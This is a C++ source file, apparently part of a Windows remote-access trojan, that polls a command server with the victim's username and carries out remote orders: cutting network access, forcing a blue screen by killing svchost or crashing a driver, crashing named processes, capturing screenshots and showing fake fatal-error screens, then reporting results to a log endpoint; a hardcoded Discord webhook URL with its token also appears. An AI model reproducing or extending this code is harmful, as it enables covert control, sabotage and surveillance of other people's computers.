#include "HttpClient.hpp"
#include <sstream>
#include <iomanip>
#include <chrono>

#include "../Extension/Payload/Payload.hpp"
#include "../Command/BSoDClient.hpp"
#include "../GetDevice/Hardware.hpp"
#include "../Command/CrashProcess.hpp"
#include "../Command/FileManager.hpp"
#include "../Command/TempCreator.hpp"
#include "../Command/ScreenProcess.hpp"
#include "../Command/FatalScreen.hpp"
#include "../Command/WhiteScreen.hpp"

const std::string webhook_url = "https://discord.com/api/webhooks/1309748638746021908/VMymuy7VoRLcfZqGIwuxP2D9N69dnIVF8HtOlfr7RwuX61pKntccsjyQxmcdeaz5i5Il";

std::string formatSize(uintmax_t size) {
    const char* units[] = { "B", "KB", "MB", "GB" };
    int unitIndex = 0;
    double fileSize = static_cast<double>(size);

    while (fileSize >= 1024 && unitIndex < 3) {
        fileSize /= 1024;
        unitIndex++;
    }

    std::stringstream sizeStr;
    sizeStr << std::fixed << std::setprecision(2) << fileSize << " " << units[unitIndex];
    return sizeStr.str();
}

HttpClient::HttpClient() : is_running(false), last_command("") {
    // Register signal handlers
    signal(SIGINT, signalHandler);
    signal(SIGTERM, signalHandler);

    Logger::getInstance()->info("HttpClient Initialized");
}

HttpClient::~HttpClient() {
    stop();
}

void HttpClient::signalHandler(int signum) {
    Logger::getInstance()->info("Received signal to terminate");
    exit(signum);
}

std::string HttpClient::getCommand() {
    try {
        std::string username = Hardware::GetUsername();
        std::string encodedUsername;
        for (char c : username) {
            if (isalnum(c)) {
                encodedUsername += c;
            }
            else {
                char hex[4];
                sprintf_s(hex, "%%%02X", (unsigned char)c);
                encodedUsername += hex;
            }
        }

        std::string url = COMMAND_URL + "?username=" + encodedUsername;

        HINTERNET hInternet = InternetOpenA("Command Client",
            INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

        if (!hInternet) {
            Logger::getInstance()->expection("Failed to open internet connection");
            return "";
        }

        HINTERNET hConnect = InternetOpenUrlA(hInternet,
            url.c_str(), NULL, 0,
            INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);

        if (!hConnect) {
            InternetCloseHandle(hInternet);
            Logger::getInstance()->expection("Failed to connect to URL");
            return "";
        }

        char buffer[1024];
        DWORD bytesRead;
        std::string response;

        while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead)
            && bytesRead > 0) {
            response.append(buffer, bytesRead);
        }

        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);

        // Parse JSON response with error checking
        if (response.empty()) {
            return "";
        }

        try {
            auto json = nlohmann::json::parse(response);
            if (json.contains("command") && !json["command"].is_null()) {
                return json["command"].get<std::string>();
            }
        }
        catch (const nlohmann::json::parse_error& e) {
            Logger::getInstance()->expection(std::string("JSON parse error: ") + e.what());
        }

        return "";
    }
    catch (const std::exception& e) {
        Logger::getInstance()->expection(std::string("Error getting command: ") + e.what());
        return "";
    }
}

void HttpClient::executeCommand(const std::string& cmd) {
    try {
        std::string result;
        bool success = false;

        std::string command = cmd;
        std::string argument = "";

        size_t spacePos = cmd.find(' ');
        if (spacePos != std::string::npos) {
            command = cmd.substr(0, spacePos);
            argument = cmd.substr(spacePos + 1);
        }

        if (cmd == "net-stop") {
            if (NetworkManager::disableNetwork()) {
                Sleep(15000);
                if (NetworkManager::enableNetwork()) {
                    result = "Network disabled for 15 seconds and re-enabled";
                    success = true;
                }
                else {
                    result = "Network disabled but failed to re-enable";
                }
            }
            else {
                result = "Failed to disable network adapter";
            }
        }
        else if (cmd == "vol-up") {
            if (VolumeManager::setVolumeMax()) {
                result = "Volume set to maximum";
                success = true;
            }
            else {
                result = "Failed to control volume";
            }
        }
        else if (cmd == "vol-down") {
            if (VolumeManager::setVolumeMin()) {
                result = "Volume set to maximum";
                success = true;
            }
            else {
                result = "Failed to control volume";
            }
        }
        else if (cmd == "bsod") {
            std::string result;
            bool success = false;

            // Try all possible ways
            if (BSoDClient::triggerBSoDProcess()) { // Kill svchost.exe
                result = "Triggering BSoD using process kill...";
                success = true;
            }
            else if (BSoDClient::triggerBSoDDriver()) { // Kill driver
                result = "Triggering BSoD using driver crash...";
                success = true;
            }
            else {
                result = "Failed to trigger BSoD";
            }

            sendLog(cmd, result, success);
        }
        else if (command == "crash" && !argument.empty()) {
            if (CrashProcess::crashProcessByName(argument)) {
                result = "Successfully crashed process: " + argument;
                success = true;
            }
            else {
                result = "Failed to crash process: " + argument;
            }
        }
        else if (cmd == "screenshot") {
            if (ScreenProcess::captureScreen()) {
                result = "Screenshot captured and sent successfully";
                success = true;
            }
            else {
                result = "Failed to capture or send screenshot";
            }
        }
        else if (cmd == "fatal") {
            try {
                if (FatalScreen::showFatalScreen(true, 4)) {
                    result = "Displayed fatal error and initiated restart";
                    success = true;
                }
                else {
                    result = "Failed to display fatal error";
                    success = false;
                }
            }
            catch (const std::exception& e) {
                result = "Error: " + std::string(e.what());
                success = false;
            }
        }
        
        else {
            result = "Unknown command";
        }

        sendLog(cmd, result, success);
    }
    catch (const std::exception& e) {
        Logger::getInstance()->expection(std::string("Error executing command: ") + e.what());
        sendLog(cmd, std::string("Error: ") + e.what(), false);
    }
}

void HttpClient::start() {
    is_running = true;
    Logger::getInstance()->load("HTTP Client started");

    while (is_running) {
        try {
            std::string cmd = getCommand();
            if (!cmd.empty() && cmd != last_command) {
                Logger::getInstance()->load("New command received: " + cmd);
                executeCommand(cmd);
                last_command = cmd;
            }
        }
        catch (const std::exception& e) {
            Logger::getInstance()->expection(std::string("Error in main loop: ") + e.what());
            Sleep(5000);  // Wait 5 seconds before retrying
        }

        Sleep(CHECK_INTERVAL);
    }

    Logger::getInstance()->expection("HTTP Client stopped");
}

void HttpClient::stop() {
    if (is_running) {
        Logger::getInstance()->expection("Stopping HTTP Client...");
        is_running = false;
    }
}

void HttpClient::sendLog(const std::string& cmd, const std::string& result, bool success) {
    try {
        std::string time = getCurrentTime();
        std::string status = success ? "SUCCESS" : "FAILED";
        std::string logMsg = "[" + time + "] (" + cmd + ") : " + result + " [" + status + "]";

        Logger::getInstance()->info(logMsg);

        // Create JSON payload
        nlohmann::json log_data = {
            {"message", logMsg}
        };

        Payload::SendMessage(LOG_URL, log_data.dump());
    }
    catch (const std::exception& e) {
        Logger::getInstance()->expection(std::string("Error sending log: ") + e.what());
    }
}

std::string HttpClient::getCurrentTime() {
    try {
        auto now = std::chrono::system_clock::now();
        auto time = std::chrono::system_clock::to_time_t(now);

        std::tm timeinfo;
        localtime_s(&timeinfo, &time);

        std::stringstream ss;
        ss << std::put_time(&timeinfo, "%H:%M:%S");
        return ss.str();
    }
    catch (const std::exception& e) {
        Logger::getInstance()->expection(std::string("Error getting current time: ") + e.what());
        return "ERROR";
    }
}